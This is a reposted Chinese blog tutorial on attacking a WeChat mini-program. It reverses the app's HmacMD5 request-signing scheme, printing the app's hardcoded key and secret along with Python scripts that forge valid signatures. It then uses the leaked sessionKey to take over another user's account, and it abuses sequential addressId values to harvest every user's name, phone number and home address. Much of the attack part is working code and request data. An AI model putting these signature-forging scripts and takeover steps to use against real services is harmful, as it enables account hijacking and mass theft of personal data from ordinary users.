#  sign加密小程序漏洞挖掘   
eeknight  网络安全者   2024-12-03 16:00  
  
## 前言  
  
通过本篇论文，你可以了解两个知识点：  
1. sign加密解密  
  
1. 小程序漏洞挖掘  
  
## 漏洞发现  
  
注册的时候点击一个获取手机号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srriaKxIygiaGS0FwwPu9aGHdbjveibhTVUVKzne0BXjzMUIZQibnKnZATeQ/640?wx_fmt=png&from=appmsg "")  
  
这里通过burp可以看到微信小程序获取手机号的三个关键参数，decryptData，sessionKey和iv。  
  
正常情况是只有decryptData和iv，如果看到sessionKey基本就是一个任意登录漏洞了。  
  
正常的小程序在获取微信提供的用户数据的时候通过sessionKey来提供甲基咪，这个sessionKey就是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sribQpDsubFJephCfxwMVKxk8rJWMYfZfTkUqj5Vgy8XC2rpVekRfr2CA/640?wx_fmt=png&from=appmsg "")  
  
首先我们通过burp的插件sessionkey crypt解密一下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srIiafPyicVuckyXaaLxg6YEo2TD6BdJD93FRk8SriaYib2hfUzPycUWLsxQ/640?wx_fmt=png&from=appmsg "")  
  
但是这里存在一个问题，这里存在sign值的验证  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srAgHCvJYn0rP1scWYrwonJQhibmS7n7ArtibiawAElVIeT3PWMWZvhx6oQ/640?wx_fmt=png&from=appmsg "")  
  
那现成的漏洞我们拿不到，接下来我们要通过逆向去吧sign的值解密出来，看看加密逻辑然后重新实现。  
## sign解密  
### 减法操作  
  
在测试加密的时候，首先要做减法，看看影响sign的参数有哪些。  
  
首先发送一个正常数据包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sr0vIj3DcTTtYVOqoukAaH8JlwGy5usQoe4JZribXy42eaZDyuRibJXfyA/640?wx_fmt=png&from=appmsg "")  
  
现在可以发送，我一点点减少  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srNyR9PIpXlHdyK2OAIkWz1WZzSQ19iazsX4eiaowE5CNMLDrJPLjlSjyA/640?wx_fmt=png&from=appmsg "")  
  
如果再减少一行的话（我这里删除了App_type: 3，不管是哪一个都是这样），会出现”公共请求Head参数缺失。”  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srgH6Z68Wx9hicJuMMkMiaaKQAWr4WGdLhSuRsRjMqKCMBFAJXG5bQh97A/640?wx_fmt=png&from=appmsg "")  
  
这里可以思考一下，还可以减少吗？  
  
其实是可以的，我们刚才减少的是参数，如果我不去参数，我去掉参数的值呢，某一些参数是可以删除的，这里通过这个，我们可以进一步判断sign的影响值是哪个。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sr7tX7u49KicibdGSodz5g7z9II5X5VBEDJlb1mIBBEhO4vpLvTJydfw6A/640?wx_fmt=png&from=appmsg "")  
  
现在我们可以判断，影响sign的值有key，Timestamp和数据包。  
  
接下来我们再少一点，找一个没有传输数据的数据包做测试。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srLsbZfsNzyXUO4B5CSOELDPmDuwOaB9pkXpNrOKRLVTxSYKctNLRDaQ/640?wx_fmt=png&from=appmsg "")  
  
这里的影响就只有key和sign了。  
### 反汇编  
  
找到减法了，接下里就是小程序反汇编，首先这里的sign是32为，很想md5，小程序反汇编后直接找关键词，md5，sign，encode等等。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sr2GbKBCjbibJUmFLjhhA6OHuPpdIjgtPBx0zpTvwz04sVQqjV3an2b9w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srKZtmhc0DXzyhBYxM2h4QiaMz1oaf7l7Y8zYHnTzHeVU7WicAO7XT4JicQ/640?wx_fmt=png&from=appmsg "")  
  
在md5的时候看到一个sign加密，而且还是用HmacMD5的，看一下这个代码。  
```
…..
sign: function(e, t, n) {
varr=n(“7123”),
o=n(“8664”);
n(“5622”),
n(“3524”);
vari=”B272F43387B8504C”,
a=”weixin”,
s=”70BAE8B491362AB39042B77C7653199D”;
functionu(e, t) {
returnt.key<e.key?-1 : t.key>e.key?1 : 0
}
e.exports= {
signRequest: function(e) {
e=e|| {};
vart= {},
n= (newDate).valueOf() +6e4;
t.timestamp=n,
t.key=i,
t.app_type=3,
t.OS_type=3,
t.device_id=a,
o.HmacMD5(s, n+””).toString(o.enc.Hex).substring(8, 24).toUpperCase();
varc= [],
l=”object”===r(e) &&”number”==typeofe.length;
for (varfine) {
vard=f;
l&& (d=e[f].key),
l?c.push(e[f]) : “object”===r(e[d]) ||c.push({
key: d,
value: e[d]
})
}
c.push({
key: “timestamp”,
value: n
}),
c.push({
key: “key”,
value: i
}),
c=c.sort(u);
varh=””;
for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {
varg=d.value[p];
h+=d.key,
h+=g
} elseh+=d.key,
h+=d.value;
varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();
returnt.sign=v,
t
},
test: function() {
o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()
}
}
},
…..
```  
  
这里有一个误导的趋势，下面的demo函数里面有一个测试值，我们可以看到  
  
varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();  
  
这里是用h和s，用n作为秘钥加密的，s是secret的值，是固定的s = “70BAE8B491362AB39042B77C7653199D”;  
  
h前面的说法是h += d.value;也就是d的值相加  
```
c.push({
key: “timestamp”,
value: n
  }),
c.push({
key: “key”,
value: i
  }),
c=c.sort(u);
varh=””;
for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {
varg=d.value[p];
h+=d.key,
h+=g
} elseh+=d.key,
h+=d.value;
```  
  
  
我们看到key和timestamp，结合我们刚才的无参数的值，再看看demo里面的  
  
o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()  
  
HmacMD5(timestamp+timestamp的值+searchType2[不知道干什么用的]+key+key的值+secret)再用时间戳作为秘钥  
  
这里的误区就是searchType2，刚开始我以为他有用，发现死活加密不出来，后面不用这个值，直接加密发现就可以了。  
  
无传输数据的数据包  
```
Os_type:
App_type:
Device_id:
Key: B272F43387B8504C
Sign: 73A8C93DC2A4CA79A8897879DDF54EA7
Content-Type: application/x-www-form-urlencoded
Timestamp: 1719387012630
Connection: close
Content-Length: 2
{}
加密脚本
importhmac
importhashlib
key = “B272F43387B8504C”;
timestamp = 1719387012630;
timestamp = str(timestamp)
secret = “70BAE8B491362AB39042B77C7653199D”;
str1 = ‘timestamp’+timestamp+’key’+key+secret
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)
mac.digest()
str_encode = mac.hexdigest().upper()
print(str_encode)
# 73A8C93DC2A4CA79A8897879DDF54EA7
```  
  
  
首次加密没问题了，接下来是有参数的，我找了一个只有一个参数的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srn6cz5bq8pgY4FZEunUmzaVklyAwjQYYia2jlc4RVFCfBcxuxsmulqqQ/640?wx_fmt=png&from=appmsg "")  
  
刚才是直接拼接，再仔细看一下有一个排序操作c = c.sort(u);  
，从demo的timestamp—>searchType—>key，想着会不会是以ZYXWVUTSRQPONMLKJIHGFEDCBA排序，按这个思路，我把addressCode放到key的前面加密  
```
Os_type:
App_type:
Device_id:
Key: B272F43387B8504C
Sign: 285F822334E8978E25D92D8975A3479C
Content-Type: application/x-www-form-urlencoded
Timestamp: 1719387013084
Connection: close
Content-Length: 13
addressCode=2
输出脚本
importhmac
importhashlib
key = “B272F43387B8504C”;
timestamp = 1719387013084;
timestamp = str(timestamp)
secret = “70BAE8B491362AB39042B77C7653199D”;
addressCode = “2”
str1 = ‘timestamp’+timestamp+’key’+key+”addressCode”+addressCode+secret
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)
mac.digest()
str_encode = mac.hexdigest().upper()
print(str_encode)
# 285F822334E8978E25D92D8975A3479C
```  
  
  
所以思路就是把所有参数按字母排序然后加密出来，对于多个参数，这里是通过键值对的反思。  
```
for (var f in c) if ((d = c[f]).value instanceof Array) for (var p in d.value) {
  var g = d.value[p];
  h += d.key,
  h += g
}
```  
  
  
把数据包的按=号前后提取分配，回到sessionkey来，测试sign的加密方式，这里在测试的时候发现直接进行url解密的时候会出现报错。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sryXibiadGfcHlDVHWzEibTv0EGneplFZl6InUgD2gz2eOtRlPJKenC9dZw/640?wx_fmt=png&from=appmsg "")  
  
在处理加密的逻辑的时候，先按前面逻辑处理一下  
```
Content-Length: 318
Os_type:
Key: B272F43387B8504C
Sign: 03E03380485A6FE4BA9FFFD0AE555C42
Device_id:
Content-Type: application/x-www-form-urlencoded
App_type:
Timestamp: 1719387015597
Connection: close
decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D
importhmac
importhashlib
key = “B272F43387B8504C”;
timestamp = 1719387015597;
timestamp = str(timestamp)
secret = “70BAE8B491362AB39042B77C7653199D”;
decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”
sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”
iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”
str1 = ‘timestamp’+timestamp+’sessionKey’+sessionKey+’key’+key+’iv’+iv+”decryptData”+decryptData+secret
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)
mac.digest()
str_encode = mac.hexdigest().upper()
print(str_encode)
#EEDB56B05B83B1A2D1660509F6387A06
```  
  
  
这里是思考为什么报错，然后想着会不会是url解码问题，我在处理sign加密的时候加一个url解码，发现就可以了  
```
importhmac
importhashlib
importurllib.parse
fromurllib.parseimportunquote
key = “B272F43387B8504C”;
timestamp = 1719387015597;
timestamp = str(timestamp)
secret = “70BAE8B491362AB39042B77C7653199D”;
decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”
sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”
iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”
str1 = ‘timestamp’+timestamp+’sessionKey’+urllib.parse.unquote(sessionKey) +’key’+key+’iv’+urllib.parse.unquote(iv) +”decryptData”+urllib.parse.unquote(decryptData) +secret
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)
mac.digest()
str_encode = mac.hexdigest().upper()
print(str_encode)
#03E03380485A6FE4BA9FFFD0AE555C42
现在sign值已经解密出来了，这样一步步写太麻烦了，就改进一下脚本。
importhmac
importhashlib
importurllib.parse
fromurllib.parseimportunquote
request_data = f”””
Content-Length: 318
Os_type:
Key: B272F43387B8504C
Sign: 03E03380485A6FE4BA9FFFD0AE555C42
Device_id:
Content-Type: application/x-www-form-urlencoded
App_type:
Timestamp: 1719387015597
Connection: close
decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D
“””
params = request_data.split(‘\n’)
formatted_output = {“key”: “B272F43387B8504C”}
foriteminparams:
ifitem.startswith(‘Timestamp: ‘):
timestamp_value = item.split(‘Timestamp: ‘)[1]
formatted_output[‘timestamp’] = timestamp_value
timestamp = timestamp_value
datas = params[-2]
params_list = datas.split(‘&’)
forparaminparams_list:
key, value = param.split(‘=’, 1)
value = urllib.parse.unquote(value)
formatted_output[key] = value
str1 = []
forkey, valueinformatted_output.items():
str1.append(key+value)
sorted_str1 = sorted(str1, key=lambdas: s[0])
str2 = “”
forvainsorted_str1[::-1]:
str2 += va
str2 += “70BAE8B491362AB39042B77C7653199D”
mac = hmac.new(key=timestamp.encode(), msg=str2.encode(),digestmod=hashlib.md5)
mac.digest()
str_encode = mac.hexdigest().upper()
print(str_encode)
```  
  
  
这里给出数据包，就自动提取参数，然后加密。  
## 再次挖掘  
### 用户接管漏洞  
  
现在sign有了，我们最开始的任意用户绑定登录就可以拿下了。使用两个账号，实现一个正常用户登录，另一个攻击者来接管这个账号。  
  
正常用户注册登录如下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srrar2Z4pwZCicEDeXibdonSvZ0supfE0apWBlyYicBicydicqKpq7hbkJhfA/640?wx_fmt=png&from=appmsg "")  
  
攻击者在获取手机号的时候截取数据包。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srQVzJ0yXDxf4kDxYGvyzPUXpnRovwTxDmdYhyd0s5c1dXtCw9JHsUAw/640?wx_fmt=png&from=appmsg "")  
  
通过sessionkey来修改登录的数据包，然后通过脚本生成sign缀  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srfSuia6HzibwZWGlNTkWvbVC5cuU7soe5r6DH52iapXHicFbIr8OhLJqWJg/640?wx_fmt=png&from=appmsg "")  
  
然后登录，可以直接接管正常用户的数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sryN0D6ibk9NlauM5cDkIOQyAppkqZeJWxJdMoF9HN46icb1fKZmjR1ckg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srwbbAK9LuJ8m5ibKatibw3pjNlh0R4a35bibc6LCK3tdlHE6ib9SHLfh7Pw/640?wx_fmt=png&from=appmsg "")  
  
可以看到我现在不是19开头的，但是我可以登录19的账号，实现接管，并修改账号名。  
### 信息泄露  
  
除此之外，有了sign值，可以看一下其他漏洞，这里还发现了一个用户信息泄露（图片比较模糊，重点是提供一个思路）。  
  
在购物车下订单，我们可以获取订单信息，这里是生成订单的时候有一个addressId，假设我们可以获取别人的值，是不是可以造成别人的敏感信息泄露，手机号，姓名，家庭地址。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srHMpynXHAjgf2WgjvyZly4dib05gZpJQ67Bb6viaaMzekr9SsyZMEhQ4Q/640?wx_fmt=png&from=appmsg "")  
  
在这里我们生成订单，然后不要支付，点击我的订单然后抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1sr90agjNWhxqu0z1KraqMOlB3p0WcEU9Hbpe9JQJ7dicic3XXRynF3vWUQ/640?wx_fmt=png&from=appmsg "")  
  
查看订单然后抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/0JJXjA8siccyvYibsibaPByKPEqYKa1O1srmTbqOibtvG8YpRlLGYzVJSbaJjHEk6ibLzXfr1FXcmiaicKuZl7l9MRpYw/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到别人的订单信息了，这里的addressId是按顺序生成的，所以可以看到所有人的敏感信息，但是由于限制了订单，所以我们要先下单—修改id—查看信息—取消—下单这样循环才可以看到全站人的信息。这里写一个脚本处理其实就可以了，sign的获取通过配合前面的脚本，然后生成就好了。  
  
这个小程序的漏洞就看了两个，主要就是一个sign的加密解密逻辑和小程序漏洞挖掘而已，如果有说的不对的，恳请各位师傅们批评指正！！！  
###   
  
  
本文内容来自网络，如有侵权请联系删除  
  
转载地址：https://www.anquanke.com/post/id/297719  
  
  
  
  
  
个人微信：ivu123ivu  
  
  
**各 类 学 习 教 程 下 载 合 集**  
  
  
  
  
  
  
  
  
  
https://pan.quark.cn/s/8c91ccb5a474  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/8H1dCzib3UibuuhdO7GMx4wqK5PQMWgr8pNaudBlYJUYXP6R6LcL0d3UYmPLoiajIXwaibhvlchGibgiaBGwMSwuq58g/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
